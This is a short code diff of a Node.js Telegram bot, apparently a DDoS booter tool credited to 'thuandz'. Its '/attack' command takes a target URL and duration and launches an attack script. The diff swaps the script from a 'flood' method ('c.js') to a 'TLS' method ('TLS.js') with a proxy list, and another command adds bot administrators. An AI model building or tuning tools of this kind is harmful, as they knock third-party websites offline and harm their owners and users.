@@ -41,9 +41,9 @@ bot.onText(/\/attack (https?:\/\/[^\s]+) (\d+)/, (msg, match) => {
 
   const rate = '20';
   const thread = '9';
-  const proxy = '2.txt';
-  const method = 'flood';
-  const scriptPath = path.join(__dirname, 'c.js');
+  const proxy = 'proxies.txt';
+  const method = 'TLS';
+  const scriptPath = path.join(__dirname, 'TLS.js');
 
   bot.sendMessage(chatId, `🚀Tool by thuandz Bat đau attack vao ${url} trong ${duration} giay!`);
 
@@ -125,4 +125,5 @@ bot.onText(/\/add (\d+)/, (msg, match) => {
   ADMIN_IDS.push(newAdminId);
   bot.sendMessage(chatId, `✅ Đa them admin moi voi ID: ${newAdminId}`);
 });
+
 
